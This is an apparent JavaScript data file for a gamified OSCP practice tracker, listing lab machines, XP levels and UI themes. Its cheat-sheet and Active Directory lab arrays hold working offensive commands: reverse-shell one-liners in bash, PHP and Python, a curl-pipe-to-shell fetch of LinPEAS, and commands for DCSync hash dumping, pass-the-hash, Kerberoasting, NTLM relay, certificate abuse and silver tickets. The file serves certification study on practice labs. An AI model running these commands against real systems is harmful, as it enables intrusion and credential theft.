'use strict';

const MACHINES = [
  {id:1,  name:"Lame",          platform:"HTB",os:"Linux",  diff:"Easy",  tags:["smb","samba"],                         url:"https://app.hackthebox.com/machines/Lame"},
  {id:2,  name:"Legacy",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ms08-067","smb"],                      url:"https://app.hackthebox.com/machines/Legacy"},
  {id:3,  name:"Devel",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["ftp","iis","meterpreter"],             url:"https://app.hackthebox.com/machines/Devel"},
  {id:4,  name:"Optimum",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["hfs","rejetto"],                       url:"https://app.hackthebox.com/machines/Optimum"},
  {id:5,  name:"Netmon",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["prtg","cve"],                          url:"https://app.hackthebox.com/machines/Netmon"},
  {id:6,  name:"Jerry",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["tomcat","upload"],                     url:"https://app.hackthebox.com/machines/Jerry"},
  {id:7,  name:"Blue",          platform:"HTB",os:"Windows",diff:"Easy",  tags:["ms17-010","eternalblue"],              url:"https://app.hackthebox.com/machines/Blue"},
  {id:8,  name:"Bounty",        platform:"HTB",os:"Windows",diff:"Medium",tags:["iis","upload","token-impersonation"],  url:"https://app.hackthebox.com/machines/Bounty"},
  {id:9,  name:"Chatterbox",    platform:"HTB",os:"Windows",diff:"Medium",tags:["achat","privesc"],                     url:"https://app.hackthebox.com/machines/Chatterbox"},
  {id:10, name:"Jeeves",        platform:"HTB",os:"Windows",diff:"Medium",tags:["jenkins","keepass","token"],           url:"https://app.hackthebox.com/machines/Jeeves"},
  {id:11, name:"Active",        platform:"HTB",os:"Windows",diff:"Medium",tags:["kerberoasting","ad","gpp"],            url:"https://app.hackthebox.com/machines/Active",        isAD:true},
  {id:12, name:"Forest",        platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","as-rep-roasting","dcsync"],       url:"https://app.hackthebox.com/machines/Forest",        isAD:true},
  {id:13, name:"Sauna",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","as-rep-roasting","winpeas"],      url:"https://app.hackthebox.com/machines/Sauna",         isAD:true},
  {id:14, name:"Monteverde",    platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","azure-ad","ldap"],                url:"https://app.hackthebox.com/machines/Monteverde",    isAD:true},
  {id:15, name:"Resolute",      platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","dns-admin","dll-injection"],      url:"https://app.hackthebox.com/machines/Resolute",      isAD:true},
  {id:16, name:"Escape",        platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","mssql","silver-ticket"],          url:"https://app.hackthebox.com/machines/Escape",        isAD:true},
  {id:17, name:"Return",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ldap","printer","service-abuse"],      url:"https://app.hackthebox.com/machines/Return"},
  {id:18, name:"Timelapse",     platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","laps","winrm"],                   url:"https://app.hackthebox.com/machines/Timelapse",     isAD:true},
  {id:19, name:"Sniper",        platform:"HTB",os:"Windows",diff:"Medium",tags:["rfi","lfi","chm"],                     url:"https://app.hackthebox.com/machines/Sniper"},
  {id:20, name:"Artic",         platform:"HTB",os:"Windows",diff:"Medium",tags:["coldfusion","upload"],                 url:"https://app.hackthebox.com/machines/Artic"},
  {id:21, name:"Blunder",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["bludit","cms","suid"],                 url:"https://app.hackthebox.com/machines/Blunder"},
  {id:22, name:"OpenAdmin",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["opennetadmin","rce","ssh-key"],        url:"https://app.hackthebox.com/machines/OpenAdmin"},
  {id:23, name:"Horizontall",   platform:"HTB",os:"Linux",  diff:"Easy",  tags:["strapi","rce","laravel"],              url:"https://app.hackthebox.com/machines/Horizontall"},
  {id:24, name:"Traverxec",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["nostromo","rce","sudo"],               url:"https://app.hackthebox.com/machines/Traverxec"},
  {id:25, name:"Mirai",         platform:"HTB",os:"Linux",  diff:"Easy",  tags:["raspberry-pi","default-creds"],        url:"https://app.hackthebox.com/machines/Mirai"},
  {id:26, name:"Cronos",        platform:"HTB",os:"Linux",  diff:"Medium",tags:["dns","sqli","cron"],                   url:"https://app.hackthebox.com/machines/Cronos"},
  {id:27, name:"Nineveh",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["lfi","phpinfo","knockd"],              url:"https://app.hackthebox.com/machines/Nineveh"},
  {id:28, name:"Bastard",       platform:"HTB",os:"Windows",diff:"Medium",tags:["drupal","drupalgeddon"],               url:"https://app.hackthebox.com/machines/Bastard"},
  {id:29, name:"Buff",          platform:"HTB",os:"Windows",diff:"Easy",  tags:["gym-management","bof","tunnel"],       url:"https://app.hackthebox.com/machines/Buff"},
  {id:30, name:"Blackfield",    platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","as-rep-roasting","dcsync","lsass"],url:"https://app.hackthebox.com/machines/Blackfield",  isAD:true},
  {id:31, name:"Flight",        platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","smb","ntlm-relay","iis"],         url:"https://app.hackthebox.com/machines/Flight",        isAD:true},
  {id:32, name:"Sizzle",        platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","ldap","certifried","kerberoasting"],url:"https://app.hackthebox.com/machines/Sizzle",    isAD:true},
  {id:33, name:"Authority",     platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","ansible","adcs"],                 url:"https://app.hackthebox.com/machines/Authority",     isAD:true},
  {id:34, name:"Manager",       platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","adcs","mssql"],                   url:"https://app.hackthebox.com/machines/Manager",       isAD:true},
  {id:35, name:"Querier",       platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","mssql","xlsm","gpp-password"],    url:"https://app.hackthebox.com/machines/Querier",       isAD:true},
  {id:36, name:"Bastion",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["vhd","registry","secretsdump"],        url:"https://app.hackthebox.com/machines/Bastion"},
  {id:37, name:"Loly",          platform:"PG", os:"Linux",  diff:"Medium",tags:["wordpress","upload"],                  url:"https://portal.offsec.com/labs/practice"},
  {id:38, name:"Potato",        platform:"PG", os:"Linux",  diff:"Medium",tags:["php","sudo"],                          url:"https://portal.offsec.com/labs/practice"},
  {id:39, name:"Gaara",         platform:"PG", os:"Linux",  diff:"Easy",  tags:["enumeration","privesc"],               url:"https://portal.offsec.com/labs/practice"},
  {id:40, name:"BBScute",       platform:"PG", os:"Linux",  diff:"Medium",tags:["cms","suid"],                          url:"https://portal.offsec.com/labs/practice"},
  {id:41, name:"Blogger",       platform:"PG", os:"Linux",  diff:"Hard",  tags:["wordpress","lxd"],                    url:"https://portal.offsec.com/labs/practice"},
  {id:42, name:"Stapler",       platform:"PG", os:"Linux",  diff:"Hard",  tags:["ftp","smb","wordpress"],               url:"https://portal.offsec.com/labs/practice"},
  {id:43, name:"Amaterasu",     platform:"PG", os:"Linux",  diff:"Hard",  tags:["snmp","ftp-exploit"],                  url:"https://portal.offsec.com/labs/practice"},
  {id:44, name:"Butch",         platform:"PG", os:"Windows",diff:"Hard",  tags:["sqli","bof"],                          url:"https://portal.offsec.com/labs/practice"},
  {id:45, name:"Nickel",        platform:"PG", os:"Windows",diff:"Hard",  tags:["dotnet","service-exploit"],            url:"https://portal.offsec.com/labs/practice"},
  {id:46, name:"Vault",         platform:"PG", os:"Windows",diff:"Hard",  tags:["ad","dpapi","secretsdump"],            url:"https://portal.offsec.com/labs/practice",           isAD:true},
  {id:47, name:"Hutch",         platform:"PG", os:"Windows",diff:"Medium",tags:["ad","laps","ldap"],                    url:"https://portal.offsec.com/labs/practice",           isAD:true},
  {id:48, name:"Heist",         platform:"PG", os:"Windows",diff:"Medium",tags:["cisco","hash","winrm"],                url:"https://portal.offsec.com/labs/practice"},
  {id:49, name:"Slort",         platform:"PG", os:"Windows",diff:"Medium",tags:["rfi","service-hijack"],                url:"https://portal.offsec.com/labs/practice"},
  {id:50, name:"Wombo",         platform:"PG", os:"Linux",  diff:"Easy",  tags:["redis","rce"],                         url:"https://portal.offsec.com/labs/practice"},
  {id:51, name:"Nibbles",       platform:"PG", os:"Linux",  diff:"Medium",tags:["mysql","binary-exploit"],              url:"https://portal.offsec.com/labs/practice"},
  {id:52, name:"Fanatastic",    platform:"PG", os:"Linux",  diff:"Hard",  tags:["cron","privesc"],                      url:"https://portal.offsec.com/labs/practice"},
  {id:53, name:"Mr Robot",      platform:"THM",os:"Linux",  diff:"Medium",tags:["wordpress","nmap","hydra"],            url:"https://tryhackme.com/room/mrrobot"},
  {id:54, name:"Overpass",      platform:"THM",os:"Linux",  diff:"Easy",  tags:["custom-auth","cron","rce"],            url:"https://tryhackme.com/room/overpass"},
  {id:55, name:"Internal",      platform:"THM",os:"Linux",  diff:"Hard",  tags:["wordpress","pivoting","jenkins"],      url:"https://tryhackme.com/room/internal"},
  {id:56, name:"Relevant",      platform:"THM",os:"Windows",diff:"Medium",tags:["smb","token-impersonation","ms17-010"],url:"https://tryhackme.com/room/relevant"},
  {id:57, name:"Skynet",        platform:"THM",os:"Linux",  diff:"Easy",  tags:["smb","email","rfi"],                   url:"https://tryhackme.com/room/skynet"},
  {id:58, name:"Daily Bugle",   platform:"THM",os:"Linux",  diff:"Hard",  tags:["joomla","sqli","yum"],                 url:"https://tryhackme.com/room/dailybugle"},
  {id:59, name:"Cicada",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","ldap","enumeration"],             url:"https://app.hackthebox.com/machines/Cicada",        isAD:true},
  {id:60, name:"Administrator", platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","ftp","acl-abuse","adcs"],         url:"https://app.hackthebox.com/machines/Administrator",  isAD:true},
];

const DEFAULT_CHEATSHEET = [
  {id:1, title:"SMB enumeration",    tags:["smb","enum"],              content:"smbclient -L //<IP> -N\nnetexec smb <IP> -u '' -p '' --shares\nenum4linux-ng -A <IP>"},
  {id:2, title:"Kerberoasting",       tags:["ad","kerberos","impacket"],content:"impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt"},
  {id:3, title:"AS-REP roasting",     tags:["ad","kerberos"],           content:"impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <IP> -no-pass\nHashcat mode: -m 18200"},
  {id:4, title:"Token impersonation", tags:["windows","privesc","token"],content:"whoami /priv\n# SeImpersonatePrivilege:\nPrintSpoofer.exe -i -c cmd\nGodPotato.exe -cmd \"cmd /c whoami\""},
  {id:5, title:"Linux SUID abuse",    tags:["linux","privesc","suid"],  content:"find / -perm -4000 -type f 2>/dev/null\n# GTFOBins: https://gtfobins.github.io"},
  {id:6, title:"DCSync attack",       tags:["ad","dcsync","secretsdump"],content:"impacket-secretsdump <domain>/<user>:<pass>@<IP>\n# Needs: GetChangesAll + GetChanges rights\nimpacket-secretsdump -just-dc-ntlm <domain>/<user>@<IP>"},
  {id:7, title:"Reverse shells",      tags:["shell","rce"],             content:"# Bash:\nbash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'\n# PHP:\nphp -r '$s=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n# Python:\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"},
  {id:8, title:"WinPEAS / LinPEAS",   tags:["enum","privesc","peas"],   content:"# LinPEAS:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# WinPEAS:\niwr -uri http://<your-ip>/winPEASx64.exe -outfile wp.exe; .\\wp.exe"},
];

const AD_LAB = [
  {
    id:"enum-ldap", name:"1. LDAP / BloodHound Enumeration",
    desc:"Always your first step. Map the entire domain before touching anything.",
    cmd:`ldapdomaindump <DC-IP> -u '<domain>\\<user>' -p '<pass>'
netexec ldap <DC-IP> -u '' -p ''
netexec ldap <DC-IP> -u <user> -p <pass> --users --groups

# BloodHound collection:
bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC-IP> -c All --zip

# Key BloodHound queries:
# - Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find all Kerberoastable Users`,
  },
  {
    id:"kerb-roast", name:"2. Kerberoasting",
    desc:"Request TGS tickets for SPN accounts. Crack offline. No special privs needed.",
    cmd:`impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC-IP> -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force`,
  },
  {
    id:"asrep", name:"3. AS-REP Roasting",
    desc:"Attack accounts with no Kerberos pre-auth required. No creds needed if you have usernames.",
    cmd:`impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile asrep.txt
# With creds:
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <DC-IP> -request
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force`,
  },
  {
    id:"pth", name:"4. Pass the Hash (PtH)",
    desc:"Authenticate with NTLM hash directly — no cracking needed.",
    cmd:`netexec smb <IP>   -u <user> -H <NTLM-hash>
netexec winrm <IP> -u <user> -H <NTLM-hash>
impacket-psexec  <domain>/<user>@<IP> -hashes :<NTLM-hash>
impacket-wmiexec <domain>/<user>@<IP> -hashes :<NTLM-hash>
evil-winrm -i <IP> -u <user> -H <NTLM-hash>`,
  },
  {
    id:"ptt", name:"5. Pass the Ticket (PtT)",
    desc:"Import a Kerberos TGT/TGS for lateral movement without the password.",
    cmd:`impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC-IP>
export KRB5CCNAME=<user>.ccache
impacket-psexec <domain>/<user>@<DC-hostname> -k -no-pass

# Windows (Rubeus):
Rubeus.exe asktgt /user:<user> /password:<pass> /ptt`,
  },
  {
    id:"dcsync", name:"6. DCSync",
    desc:"Simulate DC replication to dump all hashes. Needs GetChangesAll + GetChanges rights.",
    cmd:`impacket-secretsdump <domain>/<user>:<pass>@<DC-IP>
impacket-secretsdump -just-dc-ntlm <domain>/<user>@<DC-IP>

# After dump → PTH with Administrator hash
netexec smb <DC-IP> -u Administrator -H <hash> --local-auth`,
  },
  {
    id:"acl-abuse", name:"7. ACL / ACE Abuse",
    desc:"Exploit GenericAll, WriteDACL, GenericWrite, ForceChangePassword. BloodHound finds these.",
    cmd:`# GenericAll / GenericWrite on user → change password:
impacket-changepasswd <domain>/<target>@<DC-IP> -newpasswd 'Pwned1234!'
net rpc password <target> 'Pwned1234!' -U '<domain>/<user>%<pass>' -S <DC>

# WriteDACL on domain → grant yourself DCSync:
dacledit.py -action write -rights DCSync -principal <youruser> \\
  -target-dn 'DC=<domain>,DC=<tld>' '<domain>/<user>:<pass>'`,
  },
  {
    id:"adcs", name:"8. ADCS / Certificate Abuse",
    desc:"Misconfigured certificate templates (ESC1-ESC8). certipy is the go-to tool.",
    cmd:`# Find vulnerable templates:
certipy find -u <user>@<domain> -p <pass> -dc-ip <DC-IP> -vulnerable -stdout

# ESC1 — enrollee supplies SAN + Client Auth:
certipy req -u <user>@<domain> -p <pass> -ca <CA-name> \\
  -template <VulnTemplate> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
# → gives Administrator NTLM hash`,
  },
  {
    id:"laps", name:"9. LAPS",
    desc:"Read per-machine local admin passwords from ms-Mcs-AdmPwd in AD.",
    cmd:`netexec ldap <DC-IP> -u <user> -p <pass> -M laps
netexec ldap <DC-IP> -u <user> -p <pass> --attr ms-Mcs-AdmPwd
impacket-ldapdomaindump <DC-IP> -u '<domain>\\<user>' -p '<pass>'
# Look for ms-Mcs-AdmPwd in domain_computers.json`,
  },
  {
    id:"ntlm-relay", name:"10. NTLM Relay",
    desc:"Capture and relay NTLM auth without cracking. SMB signing must be off on target.",
    cmd:`# Check for signing-disabled hosts:
netexec smb <subnet>/24 --gen-relay-list targets.txt

# Responder with SMB+HTTP off:
responder -I tun0 -dwv --no-smb --no-http

# Relay:
impacket-ntlmrelayx -tf targets.txt -smb2support
# Interactive shell:
impacket-ntlmrelayx -tf targets.txt -smb2support -i`,
  },
  {
    id:"gpp", name:"11. GPP Password (MS14-025)",
    desc:"Credentials stored in SYSVOL Group Policy XML files. Encrypted with a public AES key.",
    cmd:`netexec smb <DC-IP> -u <user> -p <pass> -M gpp_password
netexec smb <DC-IP> -u <user> -p <pass> -M gpp_autologin

# Manual SYSVOL search:
smbclient //<DC-IP>/SYSVOL -U '<domain>\\<user>'
# Find: Groups.xml, Drives.xml, ScheduledTasks.xml
gpp-decrypt <cpassword_value>`,
  },
  {
    id:"silver-ticket", name:"12. Silver Ticket",
    desc:"Forge a TGS for a specific service using the service account NTLM hash. No DC contact.",
    cmd:`impacket-lookupsid <domain>/<user>:<pass>@<DC-IP>  # get domain SID

impacket-ticketer -nthash <service-NTLM> -domain-sid <SID> \\
  -domain <domain> -spn <SPN/hostname> <username>

export KRB5CCNAME=<username>.ccache
impacket-psexec <domain>/<username>@<hostname> -k -no-pass`,
  },
];

// Hierarchical skill map — drives the skills tab
const SKILL_CATEGORIES = [
  {
    name:   'Enumeration',
    accent: 'var(--px-blue)',
    skills: ['smb', 'dns', 'snmp', 'enumeration'],
  },
  {
    name:   'Web & Initial Access',
    accent: 'var(--px-yellow)',
    skills: ['sqli', 'lfi', 'rfi', 'upload', 'cms', 'rce'],
  },
  {
    name:   'Linux PrivEsc',
    accent: 'var(--px-mint)',
    skills: ['privesc', 'suid', 'cron', 'sudo'],
  },
  {
    name:   'Windows PrivEsc',
    accent: 'var(--px-pink)',
    skills: ['token-impersonation', 'buffer-overflow', 'service-exploit', 'registry'],
  },
  {
    name:   'Active Directory',
    accent: 'var(--px-purple)',
    skills: ['kerberoasting', 'as-rep-roasting', 'dcsync', 'adcs', 'laps', 'ntlm-relay', 'acl-abuse', 'silver-ticket', 'dns-admin', 'dpapi'],
  },
];

const XP_TABLE    = { Easy: 100, Medium: 200, Hard: 350 };
const AD_BONUS    = 75;   // extra XP per rooted AD machine
const AD_TECH_XP  = 30;  // XP per checked AD lab technique

const LEVELS = [
  { min:    0, name:"NOOB",          next:  300 },
  { min:  300, name:"SCRIPT KIDDIE", next:  900 },
  { min:  900, name:"HACKER",        next: 2500 },
  { min: 2500, name:"SR. HACKER",    next: 5500 },
  { min: 5500, name:"ELITE",         next: 9000 },
  { min: 9000, name:"OSCP READY",    next: 9000 },
];

const THEMES = {
  pastel: {
    label: "Pastel", swatch: "#b388f0",
    vars: {
      "--px-bg":"#f0e6ff","--px-bg2":"#e8d5ff","--px-surface":"#fdf6ff",
      "--px-border":"#c9a8f0","--px-purple":"#b388f0","--px-pink":"#f0a8d0",
      "--px-mint":"#a8f0d8","--px-yellow":"#f0e8a8","--px-blue":"#a8d0f0",
      "--px-red":"#f0a8a8","--px-text":"#3d2060","--px-text2":"#7a5599",
    },
  },
  dark: {
    label: "Dark", swatch: "#1a1a2e",
    vars: {
      "--px-bg":"#1a1a2e","--px-bg2":"#16213e","--px-surface":"#0f3460",
      "--px-border":"#533483","--px-purple":"#7b2d8b","--px-pink":"#e94560",
      "--px-mint":"#0f9b58","--px-yellow":"#f5a623","--px-blue":"#4a90d9",
      "--px-red":"#e94560","--px-text":"#e0e0ff","--px-text2":"#a8a8cc",
    },
  },
  hacker: {
    label: "Hacker", swatch: "#0d1117",
    vars: {
      "--px-bg":"#0d1117","--px-bg2":"#161b22","--px-surface":"#21262d",
      "--px-border":"#30a050","--px-purple":"#39d353","--px-pink":"#7ee787",
      "--px-mint":"#56d364","--px-yellow":"#e3b341","--px-blue":"#58a6ff",
      "--px-red":"#f85149","--px-text":"#c9d1d9","--px-text2":"#8b949e",
    },
  },
  sunset: {
    label: "Sunset", swatch: "#ff6b6b",
    vars: {
      "--px-bg":"#fff5f0","--px-bg2":"#ffe8e0","--px-surface":"#fff9f7",
      "--px-border":"#ffb08a","--px-purple":"#ff6b6b","--px-pink":"#ffa07a",
      "--px-mint":"#98d8c8","--px-yellow":"#ffd166","--px-blue":"#118ab2",
      "--px-red":"#ef476f","--px-text":"#2d1a00","--px-text2":"#8b4513",
    },
  },
};
